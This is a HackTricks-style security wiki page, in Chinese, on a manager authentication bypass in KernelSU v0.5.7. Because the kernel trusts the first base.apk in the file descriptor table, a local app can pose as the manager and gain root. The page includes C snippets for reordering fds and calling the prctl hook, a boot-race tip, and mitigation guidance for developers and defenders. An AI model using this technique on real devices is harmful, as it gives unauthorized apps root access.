# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

像 KernelSU、APatch、SKRoot 和 Magisk 这样的 Root 框架经常会修补 Linux/Android 内核，并通过挂钩的系统调用向特权用户空间“管理”应用程序暴露特权功能。如果管理身份验证步骤存在缺陷，任何本地应用程序都可以访问此通道并在已经获得 root 权限的设备上提升特权。

本页面抽象了公共研究中发现的技术和陷阱（特别是 Zimperium 对 KernelSU v0.5.7 的分析），以帮助红队和蓝队理解攻击面、利用原语和稳健的缓解措施。

---
## 架构模式：挂钩的系统调用管理通道

- 内核模块/补丁挂钩一个系统调用（通常是 prctl）以接收来自用户空间的“命令”。
- 协议通常是：magic_value, command_id, arg_ptr/len ...
- 用户空间管理应用程序首先进行身份验证（例如，CMD_BECOME_MANAGER）。一旦内核将调用者标记为受信任的管理者，就会接受特权命令：
- 授予调用者 root 权限（例如，CMD_GRANT_ROOT）
- 管理 su 的允许列表/拒绝列表
- 调整 SELinux 策略（例如，CMD_SET_SEPOLICY）
- 查询版本/配置
- 由于任何应用程序都可以调用系统调用，因此管理身份验证的正确性至关重要。

示例（KernelSU 设计）：
- 挂钩的系统调用：prctl
- 转发到 KernelSU 处理程序的魔法值：0xDEADBEEF
- 命令包括：CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT 等。

---
## KernelSU v0.5.7 身份验证流程（如实现）

当用户空间调用 prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...) 时，KernelSU 验证：

1) 路径前缀检查
- 提供的路径必须以调用者 UID 的预期前缀开头，例如 /data/data/<pkg> 或 /data/user/<id>/<pkg>。
- 参考：core_hook.c (v0.5.7) 路径前缀逻辑。

2) 所有权检查
- 路径必须由调用者 UID 拥有。
- 参考：core_hook.c (v0.5.7) 所有权逻辑。

3) 通过 FD 表扫描进行 APK 签名检查
- 遍历调用进程的打开文件描述符（FD）。
- 选择第一个路径匹配 /data/app/*/base.apk 的文件。
- 解析 APK v2 签名并与官方管理证书进行验证。
- 参考：manager.c（遍历 FDs），apk_sign.c（APK v2 验证）。

如果所有检查通过，内核会暂时缓存管理者的 UID，并接受来自该 UID 的特权命令，直到重置。

---
## 漏洞类别：信任“第一个匹配的 APK”来自 FD 迭代

如果签名检查绑定到在进程 FD 表中找到的“第一个匹配的 /data/app/*/base.apk”，则实际上并没有验证调用者自己的包。攻击者可以预先放置一个合法签名的 APK（真正的管理者的），使其在 FD 列表中比他们自己的 base.apk 更早出现。

这种间接信任使得一个非特权应用程序可以在没有拥有管理者签名密钥的情况下冒充管理者。

利用的关键属性：
- FD 扫描并不绑定到调用者的包身份；它仅仅是模式匹配路径字符串。
- open() 返回最低可用的 FD。通过首先关闭低编号的 FD，攻击者可以控制顺序。
- 过滤器仅检查路径是否匹配 /data/app/*/base.apk，而不是它是否对应于调用者的已安装包。

---
## 攻击前提条件

- 设备已经被一个易受攻击的 Root 框架（例如，KernelSU v0.5.7）获得 root 权限。
- 攻击者可以在本地运行任意非特权代码（Android 应用程序进程）。
- 真实的管理者尚未进行身份验证（例如，在重启后）。一些框架在成功后缓存管理者 UID；你必须赢得这场竞赛。

---
## 利用概述（KernelSU v0.5.7）

高层步骤：
1) 构建一个有效的路径到你自己的应用数据目录，以满足前缀和所有权检查。
2) 确保一个真正的 KernelSU 管理 base.apk 在一个低编号的 FD 上打开，低于你自己的 base.apk。
3) 调用 prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...) 以通过检查。
4) 发出特权命令，如 CMD_GRANT_ROOT, CMD_ALLOW_SU, CMD_SET_SEPOLICY 以保持提升。

关于步骤 2（FD 排序）的实用说明：
- 通过遍历 /proc/self/fd 符号链接来识别你自己的 /data/app/*/base.apk 的 FD。
- 关闭一个低 FD（例如，stdin，fd 0），并首先打开合法的管理 APK，以便它占据 fd 0（或任何低于你自己 base.apk fd 的索引）。
- 将合法的管理 APK 与你的应用捆绑，以便其路径满足内核的简单过滤器。例如，将其放在匹配 /data/app/*/base.apk 的子路径下。

示例代码片段（Android/Linux，仅供说明）：

枚举打开的 FDs 以定位 base.apk 条目：
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
强制较低编号的文件描述符指向合法的管理器APK：
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
通过 prctl hook 进行管理者身份验证：
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 0x100  // Placeholder; command IDs are framework-specific

static inline long ksu_call(unsigned long cmd, unsigned long arg2,
unsigned long arg3, unsigned long arg4) {
return prctl(KSU_MAGIC, cmd, arg2, arg3, arg4);
}

int become_manager(const char *my_data_dir) {
long result = -1;
// arg2: command, arg3: pointer to data path (userspace->kernel copy), arg4: optional result ptr
result = ksu_call(CMD_BECOME_MANAGER, (unsigned long)my_data_dir, 0, 0);
return (int)result;
}
```
成功后，特权命令（示例）：
- CMD_GRANT_ROOT：将当前进程提升为root
- CMD_ALLOW_SU：将您的包/UID添加到持久su的白名单中
- CMD_SET_SEPOLICY：根据框架的支持调整SELinux策略

竞态/持久性提示：
- 在AndroidManifest中注册BOOT_COMPLETED接收器（RECEIVE_BOOT_COMPLETED），以便在重启后尽早启动并在真实管理器之前尝试身份验证。

---
## 检测和缓解指导

对于框架开发者：
- 将身份验证绑定到调用者的包/UID，而不是任意FD：
- 从UID解析调用者的包，并通过PackageManager验证与已安装包的签名，而不是扫描FD。
- 如果仅限于内核，使用稳定的调用者身份（任务凭证），并在init/userspace助手管理的稳定真实来源上进行验证，而不是进程FD。
- 避免将路径前缀检查作为身份；它们可以被调用者轻松满足。
- 在通道上使用基于随机数的挑战-响应，并在启动或关键事件时清除任何缓存的管理器身份。
- 在可行的情况下，考虑基于binder的认证IPC，而不是重载通用系统调用。

对于防御者/蓝队：
- 检测root框架和管理进程的存在；如果您有内核遥测，监控带有可疑魔法常量（例如，0xDEADBEEF）的prctl调用。
- 在管理的设备上，阻止或警报来自不受信任包的启动接收器，这些接收器在启动后迅速尝试特权管理命令。
- 确保设备更新到已修补的框架版本；在更新时使缓存的管理器ID失效。

攻击的局限性：
- 仅影响已经使用易受攻击框架root的设备。
- 通常需要在合法管理器进行身份验证之前进行重启/竞态窗口（某些框架在重置之前缓存管理器UID）。

---
## 各框架相关说明

- 基于密码的身份验证（例如，历史APatch/SKRoot构建）如果密码可猜测/暴力破解或验证存在缺陷，可能会很弱。
- 基于包/签名的身份验证（例如，KernelSU）原则上更强，但必须绑定到实际调用者，而不是像FD扫描这样的间接伪影。
- Magisk：CVE-2024-48336（MagiskEoP）显示，即使成熟的生态系统也可能容易受到身份欺骗，导致在管理器上下文中执行代码。

---
## 参考文献

- [Zimperium – The Rooting of All Evil: Security Holes That Could Compromise Your Mobile Device](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [KernelSU v0.5.7 – core_hook.c path checks (L193, L201)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L193)
- [KernelSU v0.5.7 – manager.c FD iteration/signature check (L43+)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L43)
- [KernelSU – apk_sign.c APK v2 verification (main)](https://github.com/tiann/KernelSU/blob/main/kernel/apk_sign.c#L319)
- [KernelSU project](https://kernelsu.org/)
- [APatch](https://github.com/bmax121/APatch)
- [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [KSU PoC demo video (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)

{{#include ../../banners/hacktricks-training.md}}
